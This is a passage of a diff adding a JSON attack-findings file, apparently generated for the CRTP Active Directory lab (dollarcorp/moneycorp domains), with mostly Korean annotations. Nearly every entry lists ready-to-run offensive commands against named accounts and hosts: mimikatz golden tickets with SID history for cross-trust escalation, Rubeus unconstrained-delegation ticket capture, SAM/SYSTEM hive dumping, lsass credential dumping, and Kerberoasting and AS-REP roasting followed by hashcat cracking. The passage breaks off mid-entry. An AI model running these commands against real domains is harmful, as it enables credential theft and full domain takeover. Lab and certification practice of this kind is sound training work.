+    "report_notes": "대상 EUROCORP.LOCAL (SID S-1-5-21-3333069040-3914854601-3606488808). SID filtering=ON. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조.",
+    "priority": 12
+  },
+  {
+    "fid": "TRUST-MONEYCORP.LOCAL",
+    "technique": "Domain/Forest trust abuse",
+    "crtp_topic": "Cross Trust Attacks",
+    "severity": "HIGH",
+    "targets": [
+      "MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DOLLARCORP.MONEYCORP.LOCAL <-> MONEYCORP.LOCAL dir=3 type=0 transitive=True SIDfilter=OFF targetSID=S-1-5-21-335606122-960912869-3279953914"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainTrust",
+        "Get-DomainTrustMapping",
+        "Get-ADTrust -Filter *"
+      ],
+      "SID history (SID filtering OFF — 사용 가능)": [
+        "# <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)",
+        "mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-335606122-960912869-3279953914-519 /ptt"
+      ],
+      "대상 도메인 추가 열거": [
+        "Get-DomainTrust -Domain MONEYCORP.LOCAL"
+      ]
+    },
+    "verify": [
+      "신뢰 방향/타입(부모-자식 vs 포레스트)",
+      "SID filtering = OFF (OFF여야 SID history 통함)",
+      "child krbtgt 해시 확보 여부"
+    ],
+    "screenshots": [
+      "Get-DomainTrustMapping 출력",
+      "위조 티켓으로 대상 도메인 리소스 접근 화면"
+    ],
+    "report_notes": "대상 MONEYCORP.LOCAL (SID S-1-5-21-335606122-960912869-3279953914). SID filtering=OFF. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조.",
+    "priority": 12
+  },
+  {
+    "fid": "TRUST-US.DOLLARCORP.MONEYCORP.LOCAL",
+    "technique": "Domain/Forest trust abuse",
+    "crtp_topic": "Cross Trust Attacks",
+    "severity": "HIGH",
+    "targets": [
+      "US.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DOLLARCORP.MONEYCORP.LOCAL <-> US.DOLLARCORP.MONEYCORP.LOCAL dir=3 type=0 transitive=True SIDfilter=OFF targetSID=S-1-5-21-1028785420-4100948154-1806204659"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainTrust",
+        "Get-DomainTrustMapping",
+        "Get-ADTrust -Filter *"
+      ],
+      "SID history (SID filtering OFF — 사용 가능)": [
+        "# <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)",
+        "mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-1028785420-4100948154-1806204659-519 /ptt"
+      ],
+      "대상 도메인 추가 열거": [
+        "Get-DomainTrust -Domain US.DOLLARCORP.MONEYCORP.LOCAL"
+      ]
+    },
+    "verify": [
+      "신뢰 방향/타입(부모-자식 vs 포레스트)",
+      "SID filtering = OFF (OFF여야 SID history 통함)",
+      "child krbtgt 해시 확보 여부"
+    ],
+    "screenshots": [
+      "Get-DomainTrustMapping 출력",
+      "위조 티켓으로 대상 도메인 리소스 접근 화면"
+    ],
+    "report_notes": "대상 US.DOLLARCORP.MONEYCORP.LOCAL (SID S-1-5-21-1028785420-4100948154-1806204659). SID filtering=OFF. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조.",
+    "priority": 12
+  },
+  {
+    "fid": "UNCONST-DCORP-APPSRV$",
+    "technique": "Unconstrained Delegation abuse",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "DCORP-APPSRV$"
+    ],
+    "evidence": [
+      "DCORP-APPSRV$ (computer) TRUSTED_FOR_DELEGATION"
+    ],
+    "commands": {
+      "Enum (PowerView)": [
+        "Get-DomainComputer -Unconstrained | select samaccountname",
+        "Get-DomainUser -TrustedToAuth | select samaccountname"
+      ],
+      "Rubeus monitor": [
+        "Rubeus.exe monitor /interval:5 /nowrap"
+      ],
+      "Coerce (auth)": [
+        "# PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처",
+        "Rubeus.exe tgtdeleg"
+      ],
+      "PTT": [
+        "Rubeus.exe ptt /ticket:<base64_TGT>"
+      ]
+    },
+    "verify": [
+      "해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)",
+      "캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지"
+    ],
+    "screenshots": [
+      "DCORP-APPSRV$ Unconstrained delegation 속성 확인",
+      "Rubeus monitor 로 캡처된 TGT 화면",
+      "PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)"
+    ],
+    "report_notes": "비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로.",
+    "priority": 15
+  },
+  {
+    "fid": "LPRIV-SeBackupPrivilege",
+    "technique": "SeBackup -> read SAM/SYSTEM & sensitive files",
+    "crtp_topic": "Local Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "<current host>"
+    ],
+    "evidence": [
+      "token holds SeBackupPrivilege (Enabled)"
+    ],
+    "commands": {
+      "reg save": [
+        "reg save hklm\\sam sam.hiv",
+        "reg save hklm\\system system.hiv",
+        "# offline: secretsdump.py -sam sam.hiv -system system.hiv LOCAL"
+      ]
+    },
+    "verify": [
+      "escalation 후 whoami 가 'nt authority\\system' 인지",
+      "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지"
+    ],
+    "screenshots": [
+      "whoami /priv 에 SeBackupPrivilege 보이는 화면 (escalation 전)",
+      "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)"
+    ],
+    "report_notes": "Bypasses file DACLs for reads -> dump local hashes offline. Then crack / pass local admin hash.",
+    "priority": 16
+  },
+  {
+    "fid": "LPRIV-SeDebugPrivilege",
+    "technique": "SeDebug -> inject into SYSTEM process / dump lsass",
+    "crtp_topic": "Local Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "<current host>"
+    ],
+    "evidence": [
+      "token holds SeDebugPrivilege (Disabled)"
+    ],
+    "commands": {
+      "mimikatz": [
+        "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'"
+      ]
+    },
+    "verify": [
+      "escalation 후 whoami 가 'nt authority\\system' 인지",
+      "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지"
+    ],
+    "screenshots": [
+      "whoami /priv 에 SeDebugPrivilege 보이는 화면 (escalation 전)",
+      "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)"
+    ],
+    "report_notes": "Debug any process -> read lsass memory / migrate to SYSTEM. Usually implies near-admin already.",
+    "priority": 16
+  },
+  {
+    "fid": "KERB-svcadmin",
+    "technique": "Kerberoasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "svcadmin"
+    ],
+    "evidence": [
+      "svcadmin has SPN set [adminCount=1]; pwdlastset=1668416797"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe kerberoast /user:svcadmin /nowrap /outfile:hash_svcadmin.txt"
+      ],
+      "PowerView": [
+        "Invoke-Kerberoast -Identity svcadmin | fl"
+      ],
+      "AD Module": [
+        "Get-ADUser -Identity svcadmin -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName"
+      ],
+      "Crack": [
+        "hashcat -m 13100 hash_svcadmin.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)",
+      "해시 추출 성공 여부, 크랙된 평문 패스워드",
+      "크랙한 계정이 어떤 그룹/권한을 가지는지 확인"
+    ],
+    "screenshots": [
+      "svcadmin SPN 확인 (Get-ADUser/setspn 출력)",
+      "Rubeus kerberoast 해시 추출 화면",
+      "hashcat 크랙 성공 (평문 노출) 화면",
+      "크랙한 계정으로 인증/권한 확인 화면"
+    ],
+    "report_notes": "Kerberoasting svcadmin. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음.",
+    "priority": 20
+  },
+  {
+    "fid": "ASREP-VPN201user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN201user"
+    ],
+    "evidence": [
+      "VPN201user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN201user /nowrap /format:hashcat /outfile:asrep_VPN201user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN201user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN201user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN201user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN202user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN202user"
+    ],
+    "evidence": [
+      "VPN202user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN202user /nowrap /format:hashcat /outfile:asrep_VPN202user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN202user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN202user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN202user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN203user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN203user"
+    ],
+    "evidence": [
+      "VPN203user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN203user /nowrap /format:hashcat /outfile:asrep_VPN203user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN203user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN203user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN203user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN204user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN204user"
+    ],
+    "evidence": [
+      "VPN204user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN204user /nowrap /format:hashcat /outfile:asrep_VPN204user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN204user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN204user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN204user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN205user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN205user"
+    ],
+    "evidence": [
+      "VPN205user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN205user /nowrap /format:hashcat /outfile:asrep_VPN205user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN205user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN205user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN205user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN206user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN206user"
+    ],
+    "evidence": [
+      "VPN206user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN206user /nowrap /format:hashcat /outfile:asrep_VPN206user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN206user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN206user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN206user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN207user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN207user"
+    ],
+    "evidence": [
+      "VPN207user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN207user /nowrap /format:hashcat /outfile:asrep_VPN207user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN207user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN207user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN207user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN208user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN208user"
+    ],
+    "evidence": [
+      "VPN208user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN208user /nowrap /format:hashcat /outfile:asrep_VPN208user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN208user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN208user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN208user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN209user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN209user"
+    ],
+    "evidence": [
+      "VPN209user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN209user /nowrap /format:hashcat /outfile:asrep_VPN209user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN209user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN209user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN209user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN210user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN210user"
+    ],
+    "evidence": [
+      "VPN210user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN210user /nowrap /format:hashcat /outfile:asrep_VPN210user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN210user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN210user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN210user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN211user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN211user"
+    ],
+    "evidence": [
+      "VPN211user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN211user /nowrap /format:hashcat /outfile:asrep_VPN211user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN211user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN211user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN211user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN212user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN212user"
+    ],
+    "evidence": [
+      "VPN212user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN212user /nowrap /format:hashcat /outfile:asrep_VPN212user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN212user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN212user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN212user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN213user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN213user"
+    ],
+    "evidence": [
+      "VPN213user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN213user /nowrap /format:hashcat /outfile:asrep_VPN213user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN213user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN213user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN213user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN214user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN214user"
+    ],
+    "evidence": [
+      "VPN214user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN214user /nowrap /format:hashcat /outfile:asrep_VPN214user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN214user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN214user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN214user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN215user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN215user"
+    ],
+    "evidence": [
+      "VPN215user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN215user /nowrap /format:hashcat /outfile:asrep_VPN215user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN215user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN215user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN215user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN216user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN216user"
+    ],
+    "evidence": [
+      "VPN216user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN216user /nowrap /format:hashcat /outfile:asrep_VPN216user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN216user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN216user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN216user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN217user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN217user"
+    ],
+    "evidence": [
+      "VPN217user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN217user /nowrap /format:hashcat /outfile:asrep_VPN217user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN217user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN217user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN217user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN218user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN218user"
+    ],
+    "evidence": [
+      "VPN218user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN218user /nowrap /format:hashcat /outfile:asrep_VPN218user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN218user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN218user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN218user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN219user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN219user"
+    ],
+    "evidence": [
+      "VPN219user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN219user /nowrap /format:hashcat /outfile:asrep_VPN219user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN219user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN219user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN219user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ASREP-VPN220user",
+    "technique": "AS-REP Roasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "VPN220user"
+    ],
+    "evidence": [
+      "VPN220user has DONT_REQ_PREAUTH set"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe asreproast /user:VPN220user /nowrap /format:hashcat /outfile:asrep_VPN220user.txt"
+      ],
+      "AD Module": [
+        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      ],
+      "Crack": [
+        "hashcat -m 18200 asrep_VPN220user.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "preauth 미요구 플래그 확인",
+      "해시 추출 및 크랙 결과"
+    ],
+    "screenshots": [
+      "VPN220user DoesNotRequirePreAuth 확인 화면",
+      "Rubeus asreproast 추출 화면",
+      "hashcat 크랙 성공 화면"
+    ],
+    "report_notes": "AS-REP roasting VPN220user — 사전 인증 불필요 계정.",
+    "priority": 22
+  },
+  {
+    "fid": "ACL-GenericWrite-APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL-1123",
+    "technique": "ACL abuse: GenericWrite",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
